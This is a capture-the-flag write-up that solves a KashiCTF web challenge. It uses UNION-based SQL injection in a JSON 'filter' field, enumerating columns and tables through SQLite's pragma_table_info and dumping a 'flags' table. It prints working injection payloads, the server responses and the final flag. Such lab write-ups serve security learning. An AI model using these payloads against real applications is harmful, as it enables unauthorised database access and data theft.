# Challenge description

The disgruntled employee also stashed some company secrets deep within the database, can you find them out?

# Soluce

Before reading this solution, you should read the solution of the previous challenge: [corporate-life-1](../corporate-life-1/soluce.md).

We know with the previous challenge that we can do SQL injection in the filter field. Let's try to do the same here to know the number of columns in the table.

When we try with 1 2 3 4 and 5 columns, we get the following response:

```json
{"error":"Internal Server Error: Database communication failed"}
```

So we know that there are more than 5 columns. Let's try with 6 columns:

```json
{ "filter": "pending' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL --" }
```

The response is:

```json
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
ETag: "71zvs9a6n82v"
Content-Length: 103
Vary: Accept-Encoding
Date: Sat, 22 Feb 2025 16:46:13 GMT
Connection: keep-alive
Keep-Alive: timeout=5

[{"employee_name":null,"request_detail":null,"status":null,"department":null,"role":null,"email":null}]
```

Now we know that there are 6 columns in the table. Let's try to get the name of the columns.

```json
{ "filter": "pending' UNION SELECT column_name, NULL, NULL, NULL, NULL, NULL FROM users --" }
```

This returns nothing, we try a lot of logical names, and we finally find the name of the table with the following request:

```json
{ "filter": "pending' UNION SELECT table_name, NULL, NULL, NULL, NULL, NULL FROM flags --" }
```

This doesn't return an internal server error, but this:

```json
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
ETag: "71zvs9a6n82v"
Content-Length: 103
Vary: Accept-Encoding
Date: Sat, 22 Feb 2025 16:57:00 GMT
Connection: keep-alive
Keep-Alive: timeout=5

[{"employee_name":null,"request_detail":null,"status":null,"department":null,"role":null,"email":null}]
```

Now we know that the table is called flags. Let's try this to know if the table is empty:

```json
{ "filter": "pending' UNION SELECT (SELECT COUNT(*) FROM flags), NULL, NULL, NULL, NULL, NULL --" }
```

This returns 6, so there are 6 rows in the table. Let's try to get the number of columns in the flags table:

```json
{ "filter": "pending' UNION SELECT (SELECT COUNT(*) FROM pragma_table_info('flags')), NULL, NULL, NULL, NULL, NULL --" }
```

This returns 2, so there are 2 columns in the flags table. Let's try to get the name of the columns:

```json
{ "filter": "pending' UNION SELECT (SELECT name FROM pragma_table_info('flags') LIMIT 1), NULL, NULL, NULL, NULL, NULL --" }
```

This returns "request_id". Let's try to get the name of the second column:

```json
{ "filter": "pending' UNION SELECT (SELECT name FROM pragma_table_info('flags') LIMIT 1 OFFSET 1), NULL, NULL, NULL, NULL, NULL --" }
```

This returns "secret_flag". Now we know the name of the columns. Let's try to get the content of the table:

```json
{ "filter": "pending' UNION SELECT request_id, secret_flag, NULL, NULL, NULL, NULL FROM flags --" }
```

This returns:

```json
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
ETag: "fbzx4zjs27hp"
Content-Length: 637
Vary: Accept-Encoding
Date: Sat, 22 Feb 2025 17:08:45 GMT
Connection: keep-alive
Keep-Alive: timeout=5

[{"employee_name":1,"request_detail":"KashiCTF","status":null,"department":null,"role":null,"email":null},{"employee_name":3,"request_detail":"{b0r1ng_o","status":null,"department":null,"role":null,"email":null},{"employee_name":8,"request_detail":"ld_c0rp0","status":null,"department":null,"role":null,"email":null},{"employee_name":15,"request_detail":"_l1f3_am_","status":null,"department":null,"role":null,"email":null},{"employee_name":19,"request_detail":"1_r1gh7_","status":null,"department":null,"role":null,"email":null},{"employee_name":21,"request_detail":"JfoWO1oy}","status":null,"department":null,"role":null,"email":null}]
```

The flag is `KashiCTF{b0r1ng_old_c0rp0_l1f3_am_1_r1gh7_JfoWO1oy}`.